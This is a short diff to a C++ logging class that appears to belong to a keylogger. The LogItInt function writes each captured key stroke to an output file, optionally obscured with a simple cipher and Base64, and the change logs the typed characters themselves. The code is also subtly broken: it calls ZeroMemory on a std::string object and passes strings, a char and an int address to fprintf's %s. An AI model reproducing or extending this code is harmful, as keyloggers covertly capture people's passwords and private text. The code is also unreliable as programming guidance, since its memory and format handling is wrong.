@@ -27,6 +27,7 @@ std::string Log::EncryptMyString(std::string UnencryptedString) {
             }
         }
         UnencryptedString = CryptedString;
+        ZeroMemory(&CryptedString,sizeof(CryptedString));
         Base64::encode(ThrowAwayKey, &CryptedString);
         UnencryptedString += CryptedString + ';';
     }
@@ -79,8 +80,9 @@ void Log::LogItInt(int key_stroke) {
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
     else {
         if (CryptLogs) {
-            fprintf(OUTPUT_FILE, "%s", EncryptMyString(std::to_string(key_stroke)));
-            fprintf(OUTPUT_FILE, "%s", ';');
+            std::string Temp;
+            Temp += (char)key_stroke;
+            fprintf(OUTPUT_FILE, "%s", EncryptMyString(Temp));
         }
         else
             fprintf(OUTPUT_FILE, "%s", &key_stroke);
